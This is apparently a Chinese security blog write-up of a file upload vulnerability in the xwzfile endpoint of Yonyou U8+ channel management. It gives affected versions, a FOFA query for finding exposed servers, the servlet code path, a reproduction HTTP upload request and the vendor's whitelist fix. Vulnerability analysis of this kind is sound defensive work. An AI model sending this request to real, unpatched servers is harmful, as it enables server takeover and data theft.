---
title: "用友U8+渠道管理(高级版) xwzfile 文件上传漏洞"
source: https://mrxn.net/jswz/yonyou-xwzfile-upload-rce.html
asset_dir: assets/用友u8+渠道管理(高级版)-xwzfile-文件上传漏洞
---

# 用友U8+渠道管理(高级版) xwzfile 文件上传漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/8/22 10:17
- 1285浏览
- [6评论](#comment)
- 14分钟阅读

深入探索

服务器

CRM

SQL

---

# 漏洞简介

[用友](https://mrxn.net/tag/%E7%94%A8%E5%8F%8B)U8+是用友网络科技股份有限公司推出的企业管理综合平台，广泛应用于财务、进销存、人力资源等企业核心业务系统中。在U8+渠道管理（高级版）模块中，存在一处[文件上传](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0)漏洞，位于其 `xwzfile` 接口。攻击者可通过构造特定的HTTP请求，将恶意脚本或可执行文件上传至服务器。该漏洞可能导致攻击者在目标服务器上[执行任意代码](https://mrxn.net/tag/rce)，从而获取服务器控制权限，进一步窃取敏感数据、篡改业务数据或对内网其他系统发起攻击。

漏洞修复方案

# 影响版本

V18, V16.5, V16.1, V16.0, V15.1, V15.0, V13

# fofa语法

> title="渠道管理（高级版）"

# 漏洞分析

深入探索

在线安全工具

代码安全审计

编码转换工具

根据补丁变化

[![用友U8+渠道管理(高级版) xwzfile 文件上传漏洞](images/img-001-24c8de250da2.webp)](https://image.mrxn.net/1bae07efe9c04506b576186a6e75bb6a.webp)

直接看 `UploadWedgeServlet` 在那里引用了

计算机服务器

深入探索

技术文章订阅

漏洞扫描器

网络安全培训

```
    <!-- 新万泽费用报销单附件接口 -->
    <servlet>
        <servlet-name>UploadWedgeServlet</servlet-name>
        <servlet-class>com.gxfcsoft.framework.core.UploadWedgeServlet</servlet-class>
    </servlet>
    <servlet-mapping>
        <servlet-name>UploadWedgeServlet</servlet-name>
        <url-pattern>*.xwzfile</url-pattern>
    </servlet-mapping>
```

ok，根据servlet的映射，任意以`.xwzfile` 结尾的请求都会经由`UploadWedgeServlet` 处理，跟进看下它的实现逻辑,看补丁修复也是正则白名单检测

[![用友U8+渠道管理(高级版) xwzfile 文件上传漏洞](images/img-002-d8bfbde72161.webp)](https://image.mrxn.net/c5e0c3893e514d69bc45c52ba4fc7109.webp)

保存文件名为上传的文件原名，无任何其他操作，期间对文件类型和内容无校验或过滤，因此造成任意[文件上传漏洞](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0)，非常朴实无华！和[U8+渠道管理(高级版) imagedo 文件上传漏洞](https://mrxn.net/jswz/yonyou-imagedo-upload-rce.html)一模一样的漏洞成因！

漏洞修复方案

# 漏洞复现

```
POST /temp.xwzfile HTTP/1.1
Host: u8.mrxn.net
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="file"; filename="1.PNG"

TEST
------WebKitFormBoundary--
```

[![用友U8+渠道管理(高级版) xwzfile 文件上传漏洞](images/img-003-84aa7066cbdb.webp)](https://image.mrxn.net/8fb74229788e43c2b10ac708839dadc4.webp)

根据**getAttachAbsoluteDirectory**方法可知

[![用友U8+渠道管理(高级版) xwzfile 文件上传漏洞](images/img-004-c1cf252dc977.webp)](https://image.mrxn.net/236b1c1367524a398658a853f084a324.webp)

上传位置默认为 `/userfile/default/attach/` 目录下，访问上传文件

[![用友U8+渠道管理(高级版) xwzfile 文件上传漏洞](images/img-005-95ec4d9d54b2.webp)](https://image.mrxn.net/d43f653249de406f8431be7bb11f7da0.webp)

成功[执行我们上传代码](https://mrxn.net/tag/rce)

官方补丁修复也很直接，直接正则检测后缀是否为白名单

[![用友U8+渠道管理(高级版) xwzfile 文件上传漏洞](images/img-006-1bb82a028fb1.webp)](https://image.mrxn.net/9614b486c0554bab81151ae18ed534d9.webp)

# 参考

- [关于U8+渠道管理(高级版)存在文件上传漏洞的公告](https://security.yonyou.com/#/noticeInfo?id=727)
- <https://security.yonyou.com/#/patchInfo?identifier=29c55387e6274480b613343d8ffcd4e2>

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#Java](https://mrxn.net/tag/Java)
- [#rce](https://mrxn.net/tag/rce)
- [#用友](https://mrxn.net/tag/%E7%94%A8%E5%8F%8B)
- [#文件上传](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)
- [6.参考](#toc-6-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
